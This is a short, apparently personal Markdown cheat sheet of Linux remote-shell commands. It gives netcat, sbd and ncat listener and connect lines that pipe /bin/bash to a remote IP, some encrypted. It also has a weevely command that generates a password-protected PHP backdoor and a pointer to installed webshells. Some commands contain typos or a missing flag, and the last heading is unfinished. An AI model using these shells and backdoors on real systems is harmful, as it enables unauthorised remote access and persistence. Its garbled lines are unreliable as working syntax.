# Linux Shells

## Bash

## Netcat

#### Listen

```bash
nc -lvnp 4444
```

#### Connect

```bash
nc <IP> 4444 /bin/bash
```

## Sbd

#### Listen

```bash
sbd -lvnp 4444
sbd -lvnp 4444 -k BlueTrumpet  # Use an encryption key
```

#### Connect

```bash
sbd <IP> 4444 /bin/bash
sbd <IP> 4444 -e /bin/bash -k BlueTrumpet  # Connect using encryption key
```

## Ncat

#### Listen

```bash
ncat -lvnp 4444 --ssl  # Listen with secure connection
```

#### Connect

```bash
ncat <IP> 4444 -e /bin/bash --ssl  # Connect to secure connection
```

## Weevely

[https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

```bash
weebvely generate bedbug /root/wish.php  # Generate backdor with password 'bedbug'
```

## Web Shells

```bash
ls /usr/share/webshells  # List the different languages of webshells
```

## something...
